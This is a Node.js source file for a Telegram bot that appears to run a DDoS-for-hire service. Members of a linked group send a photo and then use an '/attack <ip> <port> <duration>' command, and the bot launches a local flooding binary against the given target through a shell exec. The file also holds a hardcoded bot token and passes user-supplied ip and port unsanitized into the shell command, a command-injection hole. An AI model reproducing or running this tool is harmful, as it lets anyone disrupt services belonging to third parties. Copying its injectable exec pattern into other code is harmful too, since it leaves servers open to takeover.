const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const express = require('express');

const TOKEN = '7909374116:AAFShC2Kc7pqxJaBoNTJLWDCbCoRAldh8Nc';  // Replace with your bot's token
const bot = new TelegramBot(TOKEN, { polling: true });

// Define IDs for the channel and group
const TARGET_CHANNEL_ID = '-1002389821535';  // Your channel ID
const TARGET_GROUP_ID = '-1002422164782';    // Your group ID
const TARGET_CHANNEL_LINK = 'https://t.me/+gav_YnkudXA4MjFl';  // Your channel link
const TARGET_GROUP_LINK = 'https://t.me/+pIv48rjCvxsyMThl';    // Your group link

let userLastAttackTime = {};
let userPhotoVerified = {};
let attackInProgress = false;  // Global lock for ongoing attack

// Function to check if user is in the channel
async function isUserInChannel(userId) {
    try {
        const member = await bot.getChatMember(TARGET_CHANNEL_ID, userId);
        return ['member', 'administrator', 'creator'].includes(member.status);
    } catch (error) {
        return false;
    }
}

// Function to check if user is in the group
async function isUserInGroup(userId) {
    try {
        const member = await bot.getChatMember(TARGET_GROUP_ID, userId);
        return ['member', 'administrator', 'creator'].includes(member.status);
    } catch (error) {
        return false;
    }
}

// Function to check if the message is from a group
function isGroupChat(message) {
    return message.chat.type === 'group' || message.chat.type === 'supergroup';
}

// Command handler for /start
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "👋 *Welcome to the Bot!* Use /help to see available commands.", { parse_mode: 'Markdown' });
});

// Command handler for /help
bot.onText(/\/help/, async (msg) => {
    if (!isGroupChat(msg)) {
        bot.sendMessage(msg.chat.id, "🚫 *Error:* This command can only be used in the group chat.");
        return;
    }

    const helpText = (
        "🛠 *Available Commands:*\n" +
        "/attack <ip> <port> <duration> - Attack a target (join the channel to use)\n" +
        "/status - Check your current attack status\n" +
        "/feedback <message> - Send feedback about the bot\n" +
        "If you haven't joined, you can join here:\n" +
        `📢 Channel: [Join Channel](${TARGET_CHANNEL_LINK})\n` +
        `📚 Group: [Join Group](${TARGET_GROUP_LINK})`
    );

    bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});

// Command handler for /feedback
bot.onText(/\/feedback (.+)/, (msg, match) => {
    if (!isGroupChat(msg)) {
        bot.sendMessage(msg.chat.id, "🚫 *Error:* This command can only be used in the group chat.");
        return;
    }

    const feedbackMessage = match[1];
    if (!feedbackMessage) {
        bot.sendMessage(msg.chat.id, "⚠️ *Usage:* /feedback <your message>");
    } else {
        bot.sendMessage(msg.chat.id, "✅ *Thank you for your feedback!*");
    }
});

// Command handler for photos
bot.on('photo', (msg) => {
    const userId = msg.from.id;
    userPhotoVerified[userId] = true;  // Mark the user as verified
    bot.sendMessage(msg.chat.id, "📸 *Photo received! You can now use /attack.*");
});

// Command handler for /status
bot.onText(/\/status/, async (msg) => {
    if (!isGroupChat(msg)) {
        bot.sendMessage(msg.chat.id, "🚫 *Error:* This command can only be used in the group chat.");
        return;
    }

    const userId = msg.from.id;
    if (userLastAttackTime[userId]) {
        const lastAttackTime = userLastAttackTime[userId];
        const timeSinceLastAttack = Math.floor((Date.now() / 1000) - lastAttackTime);
        bot.sendMessage(msg.chat.id, `⌛ *Last attack was ${timeSinceLastAttack} seconds ago.*`, { parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(msg.chat.id, "✅ *You have not performed any attacks yet.*", { parse_mode: 'Markdown' });
    }
});

// Function to run the attack command
function runAttackCommand(msg, ip, port, duration) {
    const command = `nohup ./venompapa ${ip} ${port} ${duration} 900 > /dev/null 2>&1`;
    exec(command, (error, stdout, stderr) => {
        attackInProgress = false;
        if (error) {
            bot.sendMessage(msg.chat.id, "⚠️ *Attack command failed.*", { parse_mode: 'Markdown' });
            return;
        }
        bot.sendMessage(msg.chat.id, "💥 *Attack command executed successfully.*", { parse_mode: 'Markdown' });
    });
}

// Command handler for /attack
bot.onText(/\/attack (.+)/, async (msg, match) => {
    if (!isGroupChat(msg)) {
        bot.sendMessage(msg.chat.id, "🚫 *Error:* This command can only be used in the group chat.");
        return;
    }

    const userId = msg.from.id;

    // Check if an attack is already in progress
    if (attackInProgress) {
        bot.sendMessage(msg.chat.id, "🚫 *Error:* An attack is currently in progress. Please wait until it is finished.");
        return;
    }

    // Check if the user is in the specified group
    if (!await isUserInGroup(userId)) {
        bot.sendMessage(msg.chat.id, `🚫 *Error:* You must be a member of the designated group to use this command. Please join:\n📚 Group: [Join Group](${TARGET_GROUP_LINK})`, { parse_mode: 'Markdown' });
        return;
    }

    // Check if the user has sent a photo
    if (!userPhotoVerified[userId]) {
        bot.sendMessage(msg.chat.id, '🚫 *Error:* You must send a photo in the group before using this command.');
        return;
    }

    const args = match[1].split(' ');
    if (args.length !== 3) {
        bot.sendMessage(msg.chat.id, '⚠️ *Usage:* /attack <ip> <port> <duration (max 120 sec)>', { parse_mode: 'Markdown' });
        return;
    }

    const [ip, port, durationStr] = args;
    let duration;
    try {
        duration = parseInt(durationStr, 10);
        if (isNaN(duration) || duration > 120) {
            throw new Error('Invalid duration');
        }
    } catch (error) {
        bot.sendMessage(msg.chat.id, '⚠️ *Error:* Duration must be a valid number not exceeding 120 seconds.');
        return;
    }

    // Notify the user that the attack is starting
    const attackMessage = `💥 *Attack Started on* ⬇️\n🌐 *IP:* \`${ip}\`\n🔌 *Port:* \`${port}\`\n⏳ *Duration:* ${duration} *seconds* 🔥`;
    
    bot.sendMessage(msg.chat.id, attackMessage, { parse_mode: 'Markdown' });

    currentTime = Math.floor(Date.now() / 1000);
    
    // Mark attack as in progress
    attackInProgress = true;
    
    // Run the attack command
    runAttackCommand(msg, ip, port, duration);

    // Update last attack time
    userLastAttackTime[userId] = currentTime;
});

// Start an Express server (optional, only if you want to set up for webhook or other uses)
const app = express();
app.listen(process.env.PORT || 3000, () => {
    console.log('Server is running...');
});
